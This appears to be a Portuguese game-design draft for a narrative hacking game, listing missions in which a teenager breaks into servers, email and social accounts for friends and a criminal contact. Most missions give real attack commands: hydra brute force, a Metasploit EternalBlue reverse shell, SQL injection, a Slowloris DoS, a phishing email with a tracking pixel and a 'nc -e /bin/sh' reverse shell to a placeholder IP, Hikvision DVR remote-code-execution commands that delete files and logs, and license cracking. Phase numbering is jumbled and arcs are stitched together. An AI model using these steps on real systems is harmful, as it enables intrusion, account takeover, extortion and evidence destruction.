@@ -1,0 +1,435 @@
+SESSÃO 2 – FAVORES E FRONTEIRAS (7 FASES)
+
+"Você não é criminoso. Você só está ajudando as pessoas. O problema é que as pessoas que você ajuda estão cada vez mais esquisitas."
+
+ARCO 1: "O Primeiro Cliente" (Fases 1–3)
+
+    Contexto: Depois do sucesso do cheat, o protagonista começa a ser procurado. Primeiro, um amigo da escola pede ajuda para recuperar um servidor de Minecraft. Depois, o protagonista percebe que suas notas estão ruins e decide agir.
+
+    FASE 1 – "O Servidor de Minecraft (Acesso SSH)"
+        · Descrição: Um amigo de um amigo tem um servidor de Minecraft que foi "hackeado" por um ex-administrador. Ele precisa recuperar o acesso. O protagonista descobre que o ex-admin deixou uma porta SSH aberta com uma senha fraca. O objetivo é invadir, recuperar o controle e entregar ao dono.
+        · Objetivo: Invadir o servidor via SSH usando força bruta (dicionário) e restaurar o acesso.
+        · Subobjetivos (3 etapas):
+        1. Reconhecimento: Usar nmap -p 22 <IP_servidor> para confirmar que a porta SSH está aberta.
+        2. Força Bruta: Usar hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<IP> para quebrar a senha (ela é "minecraft123").
+        3. Recuperação: Conectar via ssh root@<IP>, executar passwd para trocar a senha do root e criar um novo usuário admin. Entregar as credenciais ao amigo.
+        · Recompensa: R$50 (primeiro dinheiro com hacking). O protagonista se sente útil.
+
+    FASE 2 – "A Dívida do Amigo (Engenharia Social)"
+        · Descrição: O amigo (Carlos) aparece novamente. Ele está devendo dinheiro para um agiota e precisa "convencer" o agiota a perdoar a dívida. O protagonista não quer se envolver, mas Carlos implora. A solução: usar engenharia social para acessar o e-mail do agiota, encontrar algo comprometedor e usar como chantagem.
+        · Objetivo: Invadir o e-mail do agiota via engenharia social (recuperação de senha) e encontrar provas de atividades ilegais.
+        · Subobjetivos (3 etapas):
+        1. OSINT: Usar o navegador para encontrar informações pessoais do agiota (nome completo, data de nascimento, cidade) através de redes sociais e registros públicos fictícios.
+        2. Recuperação de Senha: Acessar a página de recuperação de senha do provedor de e-mail. Responder às perguntas de segurança com as informações coletadas. O sistema envia um link de reset para o e-mail alternativo (que o protagonista também invade com senha fraca).
+        3. Extorsão (Simulada): Dentro do e-mail, o protagonista encontra conversas sobre empréstimos ilegais e ameaças. Ele tira prints (simulados) e envia para Carlos. Carlos usa as provas para convencer o agiota a perdoar a dívida.
+        · Consequência: Carlos fica livre. O protagonista ganha R$100. Mas o agiota descobre que alguém invadiu seu e-mail (rastro deixado por Carlos). EVIDÊNCIA #005 – INVASÃO DE E-MAIL DO AGIOTA.
+
+    FASE 3 – "A Batalha das Notas (Infecção Escolar)"
+
+        · Descrição: O protagonista está reprovando em matemática. Ele leva um notebook para a escola, conecta-se ao Wi-Fi público e começa a mapear a rede. Descobre que o servidor da escola é um Windows Server 2012 com uma falha grave: MS17-010 (EternalBlue). Ele explora a vulnerabilidade, obtém uma shell reversa, escala privilégios até o root do sistema e altera as notas no banco de dados.
+        · Objetivo: Invadir a rede interna da escola através do Wi-Fi público, explorar o Windows Server, escalar privilégios e alterar as notas.
+        · Subobjetivos (5 etapas):
+        1. Mapeamento: Conectar ao Wi-Fi público (ESSID: "Escola_Publica"). nmap -sn 192.168.1.0/24 para descobrir dispositivos. Identificar o servidor (192.168.1.10) e PCs (192.168.1.50-80).
+        2. Identificação da Falha: nmap -sV -p 445 192.168.1.10 – o servidor está rodando Windows Server 2012 com a porta SMB aberta. O protagonista reconhece a vulnerabilidade EternalBlue (MS17-010).
+        3. Exploração (Shell Reversa): Usar o Metasploit (simulado) para explorar o EternalBlue:
+            ```
+            use exploit/windows/smb/ms17_010_eternalblue
+            set RHOST 192.168.1.10
+            set PAYLOAD windows/x64/meterpreter/reverse_tcp
+            exploit
+            ```
+            O protagonista obtém uma shell reversa (Meterpreter) no servidor.
+        4. Escalação de Privilégios: Usar o módulo getsystem do Meterpreter para escalar privilégios de usuário comum para SYSTEM (root do Windows). O protagonista agora tem controle total do servidor.
+        5. Alteração das Notas: Navegar pelos diretórios, localizar o banco de dados (notas.db) e usar SQLite (simulado) para alterar sua nota de 4.5 para 7.5.
+        6. Backdoor: O protagonista deixa um script agendado (via schtasks) que, toda semana, atualiza as notas dele para 7.5. Backdoor instalada com sucesso.
+        · Consequência: O protagonista passa de ano. EVIDÊNCIA #004 – EXPLORAÇÃO DE WINDOWS SERVER NA ESCOLA.
+
+
+ARCO 2: "A Namorada" (Fases 4–6)
+    Contexto: Uma menina chamada Lara começa a conversar com o protagonista pelo aplicativo de mensagens do jogo. Ela é bonita, elogia ele, diz que sempre admirou ele de longe. O protagonista se sente especial. Ninguém nunca deu tanta atenção para ele. Lara tem 3 missões para ele – na verdade, ela está usando ele para conseguir coisas. Ela é uma "armadilha com pernas".
+
+    FASE 4 – "O Primeiro Pedido (Prova do Curso)"
+        · Descrição: Lara manda uma mensagem: "Oi, você é tão inteligente. Estou fazendo um curso de informática e tô com uma prova de 10 questões. Você pode me ajudar? É bem fácil." O protagonista aceita. A prova é sobre conceitos básicos de computadores. Ele responde as 10 questões (minigame de múltipla escolha).
+        · Objetivo: Responder corretamente as 10 questões sobre informática básica.
+        · Subobjetivos:
+        1. Responder questões como:
+            · O que é CPU? (a) Unidade Central de Processamento (b) Memória RAM (c) HD (d) Fonte.
+            · O que significa HTTP? (a) HyperText Transfer Protocol (b) Hyper Transfer Text (c) High Tech Protocol (d) HTML.
+            · Qual destes é um sistema operacional? (a) Windows (b) Photoshop (c) Chrome (d) Excel.
+            · O que é um firewall? (a) Barreira de segurança (b) Antivírus (c) Navegador (d) Placa de rede.
+            · O que é criptografia? (a) Codificar dados (b) Apagar dados (c) Copiar dados (d) Compartilhar dados.
+            · (e mais 5 questões similares)
+        2. Acertar pelo menos 8 das 10 para passar.
+        · Recompensa: Lara agradece: "Nossa, você é um gênio! ❤️" O protagonista se sente valorizado. EVIDÊNCIA #006 – PRIMEIRO FAVOR PARA LARA.
+
+    FASE 5 – "O Terceiro Pedido (O Presente Misterioso)"
+        · Descrição: Lara aparece com um pedido estranho: "Meu amigo tem um site que vende coisas, mas ele esqueceu a senha do painel admin. Você pode recuperar?" O protagonista desconfia, mas Lara diz que é um amigo de infância e que ele confia nela. O protagonista acessa o site e descobre que é uma loja de produtos falsificados (réplicas de tênis e roupas).
+        · Objetivo: Invadir o painel administrativo da loja falsificada usando uma vulnerabilidade (SQL Injection) e resgatar a senha do admin.
+        · Subobjetivos:
+        1. Acessar o site e encontrar a página de login do admin (/admin).
+        2. Usar SQL Injection: ' OR '1'='1' UNION SELECT username,password FROM admins-- - para listar credenciais.
+        3. Descobrir a senha do admin (hash MD5) e quebrar com hashcat (ex: "loja2023").
+        4. Entrar no painel, resetar a senha e enviar para Lara.
+        5. Lara agradece: "Você é incrível! Vamos sair qualquer dia desses."
+        · Consequência: O protagonista ajudou uma loja de falsificados. O jogo registra: EVIDÊNCIA #008 – ENVOLVIMENTO COM COMÉRCIO ILEGAL. Lara começa a ficar mais distante. O protagonista não percebe que está sendo usado.
+
+    FASE 6 – "O Segundo Pedido (Ataque de Negação de Serviço)"
+
+        · Descrição: Lara aparece com um tom de urgência: "Amor, minha mãe tem uma pequena hamburgueria. A concorrente dela – uma rede de delivery – está fazendo promoções agressivas e roubando todos os clientes. Minha mãe está desesperada, vai fechar as portas. Você poderia derrubar o site da concorrente por algumas horas? Só para ela perder os pedidos do horário de pico e minha mãe ter uma chance de vender hoje." O protagonista hesita, mas Lara insiste: "É minha família, amor. Minha mãe vai perder tudo. Você faria isso por mim, não faria?" Ele aceita. A técnica: Slowloris – ataque DoS que satura as conexões do servidor Apache.
+        · Objetivo: Realizar um ataque DoS contra o site de delivery da concorrente da mãe de Lara usando Slowloris, derrubando-o durante o horário de pico (18h–20h).
+        · Subobjetivos (4 etapas):
+            1. Reconhecimento: O protagonista acessa o site alvo (deliveryconcorrente.ficticio.com) e verifica que ele está rodando em um servidor Apache (via nmap -sV -p 80 ou inspecionando os headers HTTP). O servidor Apache é vulnerável a ataques Slowloris.
+            2. Preparação do Ataque: O protagonista baixa o script Slowloris (simulado) do HackPad:
+            ```bash
+            git clone https://github.com/gkbrk/slowloris.git
+            cd slowloris
+            ```
+            3. Execução do Ataque: O protagonista executa o Slowloris contra o alvo exatamente às 18h:
+            ```bash
+            python3 slowloris.py -s 500 -t 1000 -p 80 deliveryconcorrente.ficticio.com
+            ```
+            · -s 500: número de conexões simultâneas.
+            · -t 1000: timeout de cada conexão (mantém aberta por 1000 segundos).
+            4. Monitoramento e Confirmação: O protagonista tenta acessar o site e confirma que ele está fora do ar (erro 500 ou timeout). Ele vê o site de delivery fora do ar durante todo o horário de pico. Envia um print para Lara. Após as 20h, ele encerra o ataque.
+            5. Limpeza: O protagonista apaga os logs locais e desconecta da VPN que usou para disfarçar o IP.
+        · Consequência: O site da concorrente fica fora do ar por 2 horas no horário de maior movimento. Centenas de pedidos são perdidos. A mãe de Lara vende mais do que o normal. Lara agradece com uma mensagem: "Você salvou minha família. Minha mãe vendeu tudo hoje. Eu nunca vou esquecer isso. ❤️" O protagonista se sente sujo, mas justifica: "Era para ajudar a família dela." EVIDÊNCIA #007 – ATAQUE DOS (SLOWLORIS) CONTRA DELIVERY CONCORRENTE.
+
+    FASE 7 – "A Vingança Digital (Deleção de Contas)"
+        · Descrição: Depois da missão da escola, o protagonista vai descansar. No dia seguinte, ele liga o PC e encontra uma mensagem de Lara: "Amor, não se estressa com aqueles babacas. Eles são idiotas, não valem a pena." O protagonista pergunta o que aconteceu. Lara explica: "Ontem, depois que você foi embora, uns caras da escola ficaram enchendo o saco. Me chamaram de nomes feios, ficaram me cantando de forma nojenta. Eu fiquei muito mal." O protagonista fica furioso: "Quem são eles?" Lara responde: "O Pedro e o Rafael. São da terceira série. Não fazem nada além de encher o saco." O protagonista decide agir: ele vai invadir as contas dos dois (redes sociais, e-mail, etc.), deletar tudo e postar mensagens humilhantes para que todos vejam.
+        · Objetivo: Invadir as contas de Pedro e Rafael, deletar todo o conteúdo (fotos, postagens, amigos) e publicar mensagens humilhantes em seus perfis.
+        · Subobjetivos (5 etapas):
+        1. OSINT e Identificação: O protagonista pesquisa os nomes no sistema da escola (que ele ainda tem acesso via backdoor) e encontra os e-mails e dados pessoais dos dois:
+            · Pedro: pedro.silva@escola.com, data de nascimento 12/03/2005.
+            · Rafael: rafael.souza@escola.com, data de nascimento 22/07/2004.
+        2. Força Bruta nas Senhas: O protagonista usa as informações coletadas (data de nascimento, nome, etc.) para gerar uma wordlist personalizada e atacar as contas de e-mail (via hydra ou similar):
+            bash
+            hydra -l pedro.silva -P wordlist.txt smtp.escola.com login
+            
+            mas não consegue por bloqueios de sitema de força bruta.
+        
+        3. Invasão das Redes Sociais: Com acesso aos e-mails, o protagonista usa o recurso "Esqueci minha senha" das redes sociais (Facebook/Instagram fictícios) para resetar as senhas. Ele entra nas contas dos dois.
+        4. Vandalismo Digital: O protagonista:
+            · Deleta todas as fotos e postagens.
+            · Publica mensagens como: "Sou um babaca que assedia meninas" e "Peço desculpas a todas que ofendi".
+            · Altera a foto de perfil para uma imagem ridícula (ex: um meme de um babuíno).
+            · Adiciona um status: "Estou de castigo, minha mãe descobriu que sou um otário."
+        5. Deleção das Contas: O protagonista acessa as configurações das contas e solicita a exclusão permanente (que leva 30 dias para ser efetivada, mas as contas ficam "congeladas" e inacessíveis).
+        6. Limpeza de Rastros: O protagonista apaga os logs de acesso da backdoor da escola e desconecta a VPN.
+        · Recompensa: Lara agradece: "Você é incrível! Eles nunca mais vão encher o saco de ninguém. Obrigada por me proteger. ❤️" O protagonista se sente um herói.
+        · Consequência: O protagonista cometeu um crime grave (invasão de contas, vandalismo digital, exclusão de dados). Ele não pensou nas consequências. EVIDÊNCIA #009 – INVASÃO E VANDALISMO DE CONTAS POR VINGANÇA.
+
+    FASE 8 – "A Vingança Digital (Phishing com Tracking + RCE)"
+
+        · Descrição: O protagonista está frustrado. O sistema de e-mail da escola não permite força bruta, não tem perguntas de segurança, não tem e-mail alternativo e a única opção de recuperação é via SMS (que ele não tem). Ele precisa de uma abordagem completamente diferente. Ele decide usar phishing direcionado com um tracking pixel para saber se os alvos abriram o e-mail. O e-mail é uma isca que atiça a curiosidade deles. Dentro do e-mail, ele envia um link que explora uma vulnerabilidade real (CVE-2021-40444 – MSHTML RCE) que, só de clicar, já entrega uma shell reversa no dispositivo da vítima. Com acesso ao dispositivo, ele pode resetar as senhas via navegador ou extrair os cookies de sessão.
+        · Objetivo: Enviar um e-mail de phishing com tracking pixel para Pedro e Rafael, confirmar que abriram, e usar o link malicioso para explorar a vulnerabilidade CVE-2021-40444, obtendo uma shell reversa e acesso aos dispositivos deles.
+        · Subobjetivos (6 etapas):
+
+        ---
+
+        1. Preparação do Ambiente de Ataque
+
+        · O protagonista configura um servidor web simples (ex: Python http.server) para hospedar o payload e receber a shell reversa.
+        · Ele prepara um arquivo .docx malicioso que explora a vulnerabilidade CVE-2021-40444 – uma falha crítica no MSHTML que permite execução remota de código apenas com a abertura de um documento Office especialmente criado . O exploit é público e bem documentado.
+        · O arquivo .docx contém um link para um servidor SMB controlado pelo protagonista, onde está hospedado um payload que, ao ser executado, abre uma shell reversa (ex: usando netcat ou um payload do Metasploit) .
+
+        ---
+
+        2. Criação do Tracking Pixel
+
+        · O protagonista gera um tracking pixel (imagem 1x1 transparente) que será embutido no e-mail. Quando a imagem for carregada (ou seja, quando o e-mail for aberto), o servidor do protagonista registra o evento .
+        · Ele usa um serviço simples como o Google Analytics Pixel Tracking ou um script próprio:
+        ```html
+        <img src="http://[SEU_IP]/track/pedro.png" width="1" height="1" />
+        ```
+        · O servidor registra: IP, data/hora e User-Agent, confirmando se o e-mail foi aberto e por quem .
+
+        ---
+
+        3. Montagem do E-mail de Phishing
+
+        · O protagonista cria um e-mail falso que atiça a curiosidade de Pedro e Rafael. Exemplo para Pedro:
+        · Assunto: "URGENTE: Fotos do intervalo – você apareceu!"
+        · Corpo: "Oi Pedro, um amigo meu te filmou no intervalo e você apareceu fazendo algo engraçado. Ele postou no link abaixo. Dá uma olhada antes que ele apague. 😂"
+        · Ele embute o tracking pixel (imagem invisível) no rodapé do e-mail para monitorar a abertura.
+
+        ---
+
+        4. Envio e Monitoramento
+
+        · O protagonista envia os e-mails para os endereços de Pedro e Rafael (via servidor SMTP falso ou webmail fictício).
+        · Ele monitora os logs do servidor: quando o tracking pixel for carregado, ele sabe que o e-mail foi aberto.
+
+        ---
+
+        5. Abertura do Link e Exploração (RCE)
+
+        · Quando Pedro (ou Rafael) clicar no link, o navegador baixa o arquivo .docx malicioso.
+        · Ao abrir o documento (ou mesmo no preview), o CVE-2021-40444 é acionado: o ActiveX malicioso faz o download do payload do servidor SMB e o executa .
+        · O payload estabelece uma shell reversa para o servidor do protagonista (ex: nc -e /bin/sh [SEU_IP] 4444 ou equivalente no Windows) . O atacante agora tem acesso ao dispositivo da vítima.
+
+        ---
+
+        6. Deleção de Contas via Dispositivo da Vítima
+
+        · Com a shell reversa, o protagonista acessa o navegador da vítima (via RDP ou extraindo cookies de sessão) e:
+        · Abre o e-mail da vítima e reseta as senhas das contas.
+        · Deleta todas as fotos e postagens das redes sociais.
+        · Publica as mensagens humilhantes.
+        · Ele também apaga os logs de acesso e desconecta a shell.
+
+        ---
+
+        Recompensa: Lara agradece: "Você é incrível! Eles nunca mais vão mexer comigo. Obrigada por me proteger. ❤️"
+
+ARCO 3: "O Mercado Clandestino" (Fase 7)
+
+    FASE 8 – "O E-mail do Diretor (Quebra de Proteção)"
+
+        · Descrição: DarkMatter envia uma mensagem: "Preciso de um favor rápido. Tenho um inimigo que trabalha como diretor em uma escola particular. Ele tem um e-mail corporativo com documentos que provam que ele está desviando dinheiro. Eu sei o endereço de e-mail dele, mas não consigo invadir porque o sistema tem 2FA (autenticação de dois fatores). Seu trabalho: descobrir uma maneira de acessar esse e-mail sem precisar do 2FA. Não é invasão de servidor, é criatividade. Se conseguir, você está dentro."
+        · Objetivo: Acessar o e-mail do diretor sem precisar do segundo fator de autenticação, usando técnicas de engenharia social reversa, exploração de recuperação de senha e ataque de força bruta contra perguntas de segurança.
+        · Dificuldade: Baixa/moderada – não envolve exploração de CVEs ou código malicioso, apenas criatividade e conhecimento de falhas humanas e de processo.
+
+        ---
+
+        Subobjetivos (4 etapas):
+
+        ---
+
+        1. OSINT – Coleta de Informações Públicas
+
+        · O protagonista pesquisa o nome do diretor (Carlos Alberto Mendes) nas redes sociais fictícias da escola e em registros públicos.
+        · Ele encontra:
+        · Data de nascimento: 15/05/1975.
+        · Cidade natal: São Paulo.
+        · Nome da mãe: Maria de Lourdes.
+        · Time de futebol: Corinthians.
+        · Nome do cachorro: Rex (postado em uma foto antiga).
+        · Essas informações são pistas para perguntas de segurança e possíveis senhas.
+
+        ---
+
+        2. Análise do Sistema de Recuperação de Senha
+
+        · O protagonista acessa a página de login do e-mail corporativo (ex: webmail.escolaparticular.com.br).
+        · Ele clica em "Esqueci minha senha" e observa o processo:
+        · O sistema pede o e-mail.
+        · Em seguida, apresenta duas opções:
+            · Enviar código por SMS (número de celular do diretor).
+            · Responder perguntas de segurança.
+        · O protagonista não tem acesso ao celular, mas pode tentar as perguntas de segurança.
+
+        ---
+
+        3. Força Bruta nas Perguntas de Segurança
+
+        · O sistema permite 5 tentativas antes de bloquear o acesso por 30 minutos.
+        · As perguntas são genéricas:
+        · Qual o nome da sua mãe? → Maria de Lourdes (acertou).
+        · Qual sua cidade natal? → São Paulo (acertou).
+        · Qual o nome do seu primeiro animal de estimação? → Rex (acertou).
+        · Qual seu time de futebol favorito? → Corinthians (acertou).
+        · Com as perguntas respondidas, o sistema permite resetar a senha.
+
+        ---
+
+        4. Acesso e Entrega
+
+        · O protagonista define uma nova senha temporária (DarkMatter2024!) e acessa o e-mail.
+        · Dentro da caixa de entrada, ele encontra os documentos mencionados por DarkMatter (planilhas de desvio de verbas).
+        · Ele não baixa os arquivos – apenas tira prints (simulados) e envia para DarkMatter como prova de que conseguiu acessar.
+        · Em seguida, ele não altera a senha (para não levantar suspeitas) e apaga os logs de acesso (se houver).
+
+        ---
+
+        Recompensa: DarkMatter responde:
+
+        "Simples, mas eficaz. Você não invadiu o servidor, você invadiu o processo de recuperação de senha. É exatamente esse tipo de criatividade que eu procuro. O convite está a caminho."
+
+        ---
+
+    FASE 9 – "A Chantagem (Invasão Direta)" (Reformulada)
+
+        Descrição: DarkMatter envia uma mensagem urgente:
+
+        "Preciso de um favor. Um cara está me chantageando com fotos comprometedoras. Ele é um ex-sócio que virou inimigo. Só consegui descobrir o IP dele até agora – 186.215.XX.XX. Ele está usando um sistema de segurança residencial com um DVR conectado à internet. Entra nesse DVR, encontra as fotos e apaga tudo. Se conseguir, você está dentro do fórum. Se falhar, nunca mais falamos."
+
+        ---
+
+        Subobjetivos (5 etapas com técnicas reais):
+
+        ---
+
+        1. Reconhecimento Inicial (nmap)
+
+        O protagonista escaneia o IP para descobrir serviços abertos:
+
+        ```bash
+        nmap -sV -p- 186.215.XX.XX
+        ```
+
+        O scan revela:
+
+        · Porta 80/tcp – Servidor web Boa HTTPd 0.94.14rc21 
+        · Porta 23/tcp – Telnet (DVR padrão) 
+        · Porta 554/tcp – RTSP (streaming de vídeo)
+
+        A assinatura "Boa HTTPd" é um forte indicador de DVR/câmera . O servidor Boa HTTPd é notório por vulnerabilidades de injeção de comando (CVE-2009-4496) .
+
+        ---
+
+        2. Tentativa de Senha Padrão (Telnet/SSH)
+
+        Antes de explorar vulnerabilidades, o protagonista tenta o mais óbvio: senhas padrão.
+
+        Ele usa telnet para tentar conexão:
+
+        ```bash
+        telnet 186.215.XX.XX
+        ```
+
+        Tenta as combinações mais comuns de DVRs :
+
+        · admin/admin
+        · root/root
+        · admin/666666
+        · root/12345
+        · support/support
+
+        Se alguma funcionar, ele tem acesso direto ao sistema. Mas, para fins didáticos, suponha que o DVR está com o Telnet desativado, mas a interface web está exposta.
+
+        ---
+
+        3. Exploração da Vulnerabilidade CVE-2021-36260 (Hikvision) ou CVE-2021-42071 (Visual Tools)
+
+        O protagonista tenta identificar a marca do DVR. O nmap já revelou o servidor Boa, que é usado por muitos fabricantes (Dahua, Hikvision, Avtech, etc.) .
+
+        Ele usa o exploit público para CVE-2021-36260 (Hikvision IP cameras/NVRs), que permite execução remota de comandos sem autenticação através de requisições HTTP maliciosas :
+
+        ```bash
+        python CVE-2021-36260.py --rhost 186.215.XX.XX --rport 80 --cmd "ls -la"
+        ```
+
+        O comando retorna a listagem de diretórios do sistema, confirmando que o DVR é vulnerável .
+
+        Alternativamente, se o DVR for da marca Visual Tools, ele pode usar o exploit para CVE-2021-42071, que injeta comandos via header User-Agent no /cgi-bin/slogin/login.py :
+
+        ```bash
+        curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' \
+        bash -s :'' http://186.215.XX.XX/cgi-bin/slogin/login.py
+        ```
+
+        Se for da marca AVTECH, o exploit conhecido é no arquivo /cgi-bin/nobody/Search.cgi (CVE sem número, mas com PoC público) .
+
+        ---
+
+        4. Encontrando as Fotos
+
+        Com a execução remota de comandos confirmada, o protagonista navega pelo sistema para encontrar os arquivos de chantagem.
+
+        Primeiro, lista diretórios comuns onde fotos podem estar:
+
+        ```bash
+        python CVE-2021-36260.py --rhost 186.215.XX.XX --rport 80 --cmd "ls -la /mnt/sdcard/"
+        ```
+
+        Descobre uma pasta suspeita: /mnt/sdcard/blackmail/. Lista o conteúdo:
+
+        ```bash
+        python CVE-2021-36260.py --rhost 186.215.XX.XX --rport 80 --cmd "ls -la /mnt/sdcard/blackmail/"
+        ```
+
+        Vê arquivos com nomes como darkmatter_comprometedor_1.jpg, darkmatter_comprometedor_2.jpg, etc.
+
+        ---
+
+        5. Deleção e Limpeza de Rastros
+
+        O protagonista deleta todos os arquivos da pasta:
+
+        ```bash
+        python CVE-2021-36260.py --rhost 186.215.XX.XX --rport 80 --cmd "rm -rf /mnt/sdcard/blackmail/*"
+        ```
+
+        Verifica se a pasta está vazia:
+
+        ```bash
+        python CVE-2021-36260.py --rhost 186.215.XX.XX --rport 80 --cmd "ls -la /mnt/sdcard/blackmail/"
+        ```
+
+        Confirma que os arquivos foram removidos.
+
+        Limpeza de rastros (opcional): O protagonista tenta apagar os logs do DVR. Em alguns modelos Hikvision, os logs ficam em /var/log/ . Ele executa:
+
+        ```bash
+        python CVE-2021-36260.py --rhost 186.215.XX.XX --rport 80 --cmd "rm -rf /var/log/*"
+        ```
+
+        ---
+
+        Recompensa: DarkMatter responde:
+
+        "Impecável. As fotos sumiram. Você é melhor do que eu pensava. O convite está a caminho."
+
+    Contexto: Depois de vários trabalhos, o protagonista recebe um convite para um fórum secreto. Lá, ele encontra pessoas que oferecem trabalhos mais sérios. Ele ainda não sabe, mas Lara está por trás de alguns desses convites.
+
+    FASE 7 – "O Teste do Grupo (Cracking de Software Pago)"
+
+        · Descrição: DarkMatter envia uma mensagem: "O grupo quer te testar. Não é quebra de hash – isso é coisa de script kiddie. Queremos ver se você sabe fazer engenharia reversa de verdade. Pegue este software pago, remova a proteção de licença e nos entregue um keygen ou um patch funcional. Se conseguir, você está dentro. Se falhar... bem, tente de novo." O protagonista baixa o instalador do software alvo (um programa de edição de vídeo/áudio ou ferramenta de produtividade paga). Ele precisa usar ferramentas de engenharia reversa para analisar o binário, localizar a rotina de verificação de licença, modificar o fluxo do programa (via patching assembly) e gerar um keygen funcional.
+        · Objetivo: Realizar engenharia reversa em um software pago desktop, localizar a rotina de validação de licença, criar um patch que burle a verificação e gerar um keygen funcional.
+        · Subobjetivos (6 etapas):
+
+        ---
+
+        1. Análise Estática com Ghidra/IDA Pro
+
+        · O protagonista abre o executável no Ghidra (ferramenta gratuita da NSA) ou IDA Pro para análise estática.
+        · Ele localiza a função main e identifica a chamada para a rotina de validação de licença (ex: ValidateLicense() ou CheckKey()).
+        · Ele também procura por strings úteis como "Invalid License", "Trial Expired", "Registration Successful" – essas strings ajudam a localizar a lógica de verificação .
+
+        ---
+
+        2. Análise Dinâmica com x64dbg/OllyDbg
+
+        · O protagonista executa o programa no x64dbg (depurador moderno) e coloca breakpoints nas funções de verificação de licença.
+        · Ele insere uma chave falsa e observa o fluxo do programa: quando a chave é rejeitada, o programa salta para uma mensagem de erro.
+        · Ele identifica a instrução de comparação (CMP) e o salto condicional (JE/JNE) que decide se a licença é válida ou não .
+
+        ---
+
+        3. Patching (Modificação do Assembly)
+
+        · O protagonista altera a instrução de salto condicional para um salto incondicional ou para um NOP (No Operation), forçando o programa a sempre aceitar a licença .
+        · Exemplo:
+        · Instrução original: JE 0x00401234 (pula para o erro se a chave for inválida).
+        · Modificação: JMP 0x00401234 (sempre pula para o código de sucesso).
+        · Ele salva o binário modificado como software_crackeado.exe .
+
+        ---
+
+        4. Code Cave (Injeção de Código Alternativo)
+
+        · Se o patching simples não funcionar (ex: o programa tem checksum de integridade), o protagonista encontra uma Code Cave (área de código não utilizada) no binário .
+        · Ele escreve um pequeno bloco de assembly que sempre retorna "True" para a verificação de licença e redireciona o fluxo do programa para essa Code Cave .
+
+        ---
+
+        5. Keygenning (Geração de Chaves Válidas)
+
+        · O protagonista analisa o algoritmo de geração de chaves. Em muitos softwares, a chave é gerada com base no nome do usuário ou HWID .
+        · Ele usa ferramentas como Resource Hacker para explorar a estrutura do binário e identificar o algoritmo .
+        · Ele escreve um keygen (gerador de chaves) em Python ou C++ que replica o algoritmo e gera chaves válidas para qualquer nome de usuário.
+
+        ---
+
+        6. Entrega do Keygen e Patch
+
+        · O protagonista envia para DarkMatter:
+        · O executável modificado (patch).
+        · O keygen funcional.
+        · Um arquivo .nfo explicando a técnica utilizada e os endereços de memória modificados.
+
+        ---
+
+        Recompensa: DarkMatter responde:
+
+        "Impecável. Você encontrou a rotina de validação, fez o patch e ainda gerou um keygen. Sabe como se faz. Você está dentro do grupo."
